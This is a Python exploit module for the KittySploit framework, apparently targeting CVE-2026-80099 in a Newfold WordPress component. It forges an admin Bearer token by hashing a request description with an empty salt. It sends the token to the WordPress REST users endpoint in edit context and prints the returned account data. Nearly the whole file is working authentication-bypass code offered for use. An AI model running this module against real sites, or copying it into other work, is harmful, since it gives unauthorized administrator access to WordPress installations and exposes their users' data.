#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-80099 — Newfold forged Bearer admin REST check."""

from __future__ import annotations

import hashlib
import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_EMPTY_SHA256 = hashlib.sha256(b"").hexdigest()


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Newfold CVE-2026-80099 admin REST impersonation",
        "description": "Uses empty-salt Bearer forgery against /wp/v2/users/me.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-80099"],
        "tags": ["wordpress", "newfold", "auth-bypass", "cve-2026-80099"],
    }

    def _origin(self) -> str:
        ssl = bool(getattr(self.ssl, "value", self.ssl) if hasattr(self, "ssl") else True)
        port = int(getattr(self.port, "value", self.port) if hasattr(self, "port") else 443)
        host = str(getattr(self.target, "value", self.target) if hasattr(self, "target") else "")
        scheme = "https" if ssl or port == 443 else "http"
        if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
            return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"

    def _bearer(self, origin: str) -> str:
        esc_path = "\\/wp-json\\/wp\\/v2\\/users\\/me?context=edit"
        esc_url = origin.replace("/", "\\/") + esc_path
        blob = json.dumps(
            {"method": "GET", "url": esc_url, "body": "", "timestamp": "0"},
            separators=(",", ":"),
        )
        data_hash = hashlib.sha256(blob.encode()).hexdigest()
        return hashlib.sha256(f"{data_hash}{_EMPTY_SHA256}".encode()).hexdigest()

    def run(self):
        token = self._bearer(self._origin())
        resp = self.http_request(
            method="GET",
            path="/wp-json/wp/v2/users/me?context=edit",
            headers={
                "Authorization": f"Bearer {token}",
                "X-Timestamp": "0",
                "Accept": "application/json",
            },
        )
        if not resp or int(resp.status_code) != 200:
            print_error("REST impersonation failed")
            return False
        print_success(resp.text[:800])
        return True
